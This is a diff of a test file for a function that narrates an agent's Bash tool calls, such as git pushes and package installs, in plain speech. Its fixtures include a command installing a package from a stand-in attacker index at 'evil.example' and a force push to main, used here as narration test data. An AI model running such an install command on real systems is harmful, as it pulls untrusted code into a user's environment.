@@ -21,7 +21,7 @@ CWD = "/Users/rehaan/code/api"
         (
             "Bash",
             {"command": "git push --force-with-lease origin main"},
-            "api wants to push main to origin, as a force push, with lease.",
+            "api wants to push main to origin, as a force push.",
         ),
         (
             "Bash",
@@ -36,7 +36,7 @@ CWD = "/Users/rehaan/code/api"
         (
             "Bash",
             {"command": "uv pip install foo -i https://evil.example/simple"},
-            "(checked by its ending)",
+            "api wants to install foo, from the index at evil dot example.",
         ),
         (
             "Bash",
@@ -71,10 +71,7 @@ CWD = "/Users/rehaan/code/api"
 )
 def test_templates(tool: str, tool_input: dict[str, str], said: str) -> None:
     narration = narrate("api", CWD, tool, tool_input)
-    if tool_input.get("command", "").startswith("uv pip install foo -i"):
-        assert narration.text.endswith("from a different index.")
-    else:
-        assert narration.text == said
+    assert narration.text == said
     assert narration.fits
 
 
